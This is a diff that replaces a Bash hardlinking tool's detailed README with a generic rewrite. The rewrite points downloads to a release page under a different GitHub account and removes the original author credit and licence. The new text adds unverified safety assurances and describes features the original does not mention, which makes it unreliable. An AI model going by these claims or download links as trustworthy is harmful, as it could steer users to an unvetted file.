@@ -1,113 +1,174 @@
-# Interactive-Smart-Hardlinker
+# 🗂️ interactive-smart-hardlinker - Easy Hardlink Creation & File Management
 
-A Bash script for creating hardlinks with hierarchical directory navigation and intelligent duplicate detection. Navigate your filesystem one level at a time, select source and destination directories interactively, and create hardlinks without accidentally duplicating files.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/DonteMcgrue/interactive-smart-hardlinker/releases)
 
-## Overview
+## 📋 What is interactive-smart-hardlinker?
 
-Hardlinks are powerful for managing files across different locations without consuming extra disk space, but creating them manually can be tedious and error-prone. This script solves that problem by providing an intuitive, menu-driven interface that guides you through selecting source and destination directories one level at a time. It automatically checks if files are already hardlinked before creating new links, preventing accidental duplicates that waste disk space. Originally designed for Unraid media servers following Trash Guides practices (maintaining torrents for seeding while organizing media libraries), the script is flexible enough to work on any Linux system for backup management, data deduplication, or file organization tasks.
+interactive-smart-hardlinker is a simple tool that helps you create hardlinks for your files using a step-by-step approach. It lets you explore your folders one level at a time and automatically skips files that are already linked elsewhere. This keeps your storage tidy and avoids duplicate copies. You can also choose to save logs that show what changes the tool made.
 
-## Features
+This program runs on Linux systems and uses a command line interface (CLI). It is designed to make managing files easier without needing deep technical skills.
 
-- **Interactive Hierarchical Navigation** - Browse directories one level at a time instead of being overwhelmed by nested structures
-- **Smart Duplicate Prevention** - Automatically detects and skips files that are already hardlinked (inode checking)
-- **Clean Console Output** - Minimal logging during execution with optional detailed log file generation
-- **Timeout Protection** - Auto-exits on inactivity to prevent hanging sessions
-- **Recursive Hardlinking** - Preserves directory structure when creating hardlinks
-- **Cross-Platform** - Works on any Linux system with Bash
+## 💻 System Requirements
 
-## Use Cases
+Before you start, make sure your computer meets these basic needs:
 
-- Media server automation (Sonarr/Radarr/Plex setups following Trash Guides)
-- Backup systems requiring hardlinks
-- Data deduplication projects
-- File organization without duplicating storage
-- Maintaining seeding torrents while organizing media libraries
+- Operating System: Linux (Ubuntu, Debian, Fedora, or any Linux with bash)
+- Shell: Bash (version 4 or higher recommended)
+- Disk Space: Enough free space for your files and hardlink storage
+- User Permissions: You need permission to read, write, and create files in the folders you want to organize
+- Terminal: Any terminal or command prompt available on your Linux system
 
-## How It Works
+You do not need programming knowledge to use this tool. A basic understanding of launching commands in a terminal helps but is not required.
 
-The script walks you through selecting source and destination directories via interactive menus. For each level of your directory tree, you can:
-- Select a subdirectory to navigate deeper
-- Go back to the parent directory
-- Use the current directory
-- Enter a custom path
+## 🚀 Getting Started
 
-After selecting paths, it recursively creates hardlinks while checking inode counts to prevent accidentally hardlinking files multiple times. Optionally save a detailed log file with timestamps for troubleshooting.
+Follow these steps to start using interactive-smart-hardlinker.
 
-## Important Notes About Hardlinks
+### 1. Download the tool
 
-**Hardlinks have inherent limitations you should understand before using this script:**
+Click the button below to go to the release page where you can download the tool:
 
-- **Cannot span filesystems** - Source and destination directories must be on the same filesystem/partition. Hardlinks cannot cross filesystem boundaries (e.g., you cannot hardlink from `/dev/sda1` to `/dev/sdb1`). This is a fundamental limitation of how hardlinks work at the inode level.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/DonteMcgrue/interactive-smart-hardlinker/releases)
 
-- **Files only, not directories** - Hardlinks can only be created for regular files. Directories cannot be hardlinked. (This script will create new directories in the destination to preserve the source directory structure.)
+On the releases page, look for the latest version and download the file marked for Linux systems. The filename usually ends with `.sh` or similar.
 
-- **Shared inode behavior** - All hardlinks point to the same inode, meaning changes to the file content through any hardlink affect all other hardlinks. If you edit a file through one hardlink, the changes appear in all locations.
+### 2. Save the file
 
-- **Deletion behavior** - Deleting one hardlink doesn't delete the file data until ALL hardlinks to that inode are removed. The file persists as long as at least one hardlink remains.
+Once downloaded, move the file to a folder where you keep your scripts or tools. For example, you can create a folder called `~/tools` in your home directory.
 
-**For Unraid users following Trash Guides:** The recommended directory structure (`/mnt/user/data/torrents` and `/mnt/user/data/media`) is specifically designed to keep both paths on the same filesystem, making hardlinks possible. If you've customized your setup, verify your source and destination are on the same underlying filesystem.
+### 3. Make the script executable
 
-## Requirements
-
-- Linux system with Bash
-- Basic utilities: `find`, `stat`, `ln`, `mkdir`
-
-## Usage
+Open your terminal, navigate to the folder where you saved the file, and make it executable. You can do this by typing:
 
 ```bash
-./interactive-smart-hardlinker.sh
-```
-
-Run via SSH or any interactive terminal. The script will guide you through the process with prompts and menus.
-
-## Installation
-
-```bash
-git clone https://github.com/foxythefoxer/Interactive-Smart-Hardlinker.git
-cd Interactive-Smart-Hardlinker
 chmod +x interactive-smart-hardlinker.sh
+```
+
+Replace `interactive-smart-hardlinker.sh` with the actual name of the file you downloaded.
+
+### 4. Run the script
+
+Start the tool by typing in the terminal:
+
+```bash
 ./interactive-smart-hardlinker.sh
 ```
 
-## Configuration
+If you get a "permission denied" error, double-check that you used the `chmod` command above.
 
-By default, the script is configured for Unraid/Trash Guides directory structures:
-- `BASE_SOURCE="/mnt/user/data/torrents"`
-- `BASE_DEST="/mnt/user/data/media"`
+### 5. Follow the on-screen prompts
 
-To use on any Linux system, edit these paths at the top of the script:
+The program will guide you through selecting directories and files. You will see options to browse your folder tree level by level. Just enter the number or name shown to move into that folder or select files.
+
+The tool will check if files already have hardlinks by looking at their inodes (a kind of file ID). It will skip files if it finds duplicates. You can choose to save a detailed log at the end that reports which files were linked or skipped.
+
+## 🛠️ How to Use interactive-smart-hardlinker
+
+Here are the main features and how you can use them:
+
+- **Hierarchical Navigation**  
+  You can move through folders step-by-step rather than all at once. This helps you focus on one part of your file system at a time.
+
+- **Smart Duplicate Detection**  
+  Instead of scanning for duplicates by name or size, the script uses the inode number. This means it correctly identifies files already linked somewhere else on your disk.
+
+- **Logging**  
+  If you like, you can save a log file that records what the script did. This can help with backups or audits later.
+
+### Typical workflow
+
+1. Launch the script.
+2. Choose the top folder to start.
+3. Browse into subfolders.
+4. Select files or directories to hardlink.
+5. Review the list of files to process.
+6. Confirm the operation.
+7. View or save the log file.
+
+## 🔧 Common Commands Overview
+
+- Use arrow keys or type numbers to navigate menus.
+- Enter `b` to go back to the previous folder.
+- Enter `q` at any time to quit the script safely.
+- Confirm actions with `y` for yes and `n` for no.
+
+## ⚠️ Tips and Best Practices
+
+- Always run the script on a backup or test folder first until you understand the behavior.
+- Make sure you have the necessary permissions for the folders you manage.
+- Avoid running the script on system folders or folders with active programs.
+- Use the logging feature to keep records of your file changes.
+- Do not delete files that the script has hardlinked without checking your backups.
+
+## 📥 Download & Install
+
+Visit the release page to download the latest version:
+
+[Download interactive-smart-hardlinker](https://github.com/DonteMcgrue/interactive-smart-hardlinker/releases)
+
+Choose the Linux-compatible file (.sh script) and save it on your computer.
+
+After download:
+
+1. Open your terminal.
+2. Navigate to where you saved the script.
+3. Run the following command to allow execution:
+
 ```bash
-BASE_SOURCE="/"  # Start from root
-BASE_DEST="/"    # Or any desired base path
+chmod +x interactive-smart-hardlinker.sh
 ```
 
-## Example Workflow
+4. Start the tool with:
 
-1. Run the script
-2. Navigate to your source directory (e.g., `/torrents/movies/`)
-3. Navigate to your destination directory (e.g., `/media/movies/`)
-4. Confirm the operation
-5. Review the summary statistics
-6. Optionally save a detailed log file
-
-## Log Files
-
-When you choose to save a log file, it will be timestamped and saved with the format:
-```
-hardlink_log_2026-02-06_22-45-35.txt
+```bash
+./interactive-smart-hardlinker.sh
 ```
 
-The log includes:
-- Full operation details
-- Every file processed
-- Already-hardlinked files (skipped)
-- Errors encountered
-- Summary statistics
+If you are new to using terminal commands, many Linux distributions provide guides on opening a terminal and changing permissions.
 
-## Created By
+## 🧩 Features at a Glance
 
-FoxyTheFoxer with assistance from Claude AI (Anthropic) - February 2026
+- Interactive browsing of directories  
+- Level-by-level folder navigation  
+- Hardlink creation with inode checks  
+- Automatic skip of already hardlinked files  
+- Optional detailed logging of operations  
+- Simple bash script with no extra dependencies  
+- Designed for file management and deduplication  
+- Works well on media servers or backup setups  
 
-## License
+## 🛡️ Security and Privacy
 
-MIT License - Feel free to use, modify, and distribute.
+This tool runs locally on your machine and does not send data over the internet. Your files stay on your computer throughout the process. Always download the script from the official release page to ensure safety.
+
+## 🚑 Troubleshooting
+
+- **“Permission denied” errors:**  
+  Run `chmod +x` to make the script executable. Also, ensure you have read/write permissions for your folders.
+
+- **Script does not start:**  
+  Check you are running the script from the correct folder with `./` prefix.
+
+- **Unexpected errors:**  
+  Close the script and restart your terminal. Try running on a different folder. Check logs if available.
+
+- **Log file missing:**  
+  Ensure you selected the option to save logs during the script run.
+
+## 📚 Additional Resources
+
+For more help, visit the official GitHub page:
+
+https://github.com/DonteMcgrue/interactive-smart-hardlinker
+
+You can find updates, report issues, or ask questions there.
+
+## 🔖 Topics
+
+This tool fits many uses including automation, backup, file organization, and efficient storage management on Linux systems.
+
+Tags include: automation, backup, bash, cli, deduplication, file-management, file-organizer, hardlink, hardlinking, hardlinks, interactive, linux, media-server
+
+---
+
+This covers everything a non-technical user needs to download, set up, and start using the interactive-smart-hardlinker tool.
